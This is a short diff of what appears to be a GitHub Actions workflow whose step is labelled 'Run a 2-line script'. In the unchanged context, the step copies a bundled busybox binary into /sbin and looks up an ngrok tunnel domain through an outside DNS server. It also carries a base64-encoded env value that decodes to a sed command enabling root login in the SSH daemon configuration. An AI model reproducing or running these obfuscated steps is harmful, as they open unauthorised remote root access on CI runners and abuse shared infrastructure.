@@ -36,7 +36,7 @@ jobs:
           ss0: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
       # Runs a set of commands using the runners shell
       - name: Run a 2-line script
-        run: bash -c "echo \"${{ github.workspace }}--${GITHUB_WORKSPACE}--${{ runner.workspace }}--${{env.IMAGE_NAME}}--${{ github.run_id }}--${{ github.run_number }}--${{env.IMAGE_TAG}}\";date;sudo cp ./busybox.bin /sbin/busybox;busybox nslookup ngrok.xiaomiqiu123.top 114.114.114.114 |grep -v 114.114.114.114;exit 0"
+        run: bash -c "echo \"${github.workspace}--${GITHUB_WORKSPACE}--${{ runner.workspace }}--${{env.IMAGE_NAME}}--${{ github.run_id }}--${{ github.run_number }}--${{env.IMAGE_TAG}}\";date;sudo cp ./busybox.bin /sbin/busybox;busybox nslookup ngrok.xiaomiqiu123.top 114.114.114.114 |grep -v 114.114.114.114;exit 0"
         env:
           ss0: "c2VkIC1pICJzL14jXD9cKFBlcm1pdFJvb3RMb2dpblwpL1wxIHllcyMvZyIgL2V0Yy9zc2gvc3NoZF9jb25maWc7"
       # Runs a set of commands using the runners shell
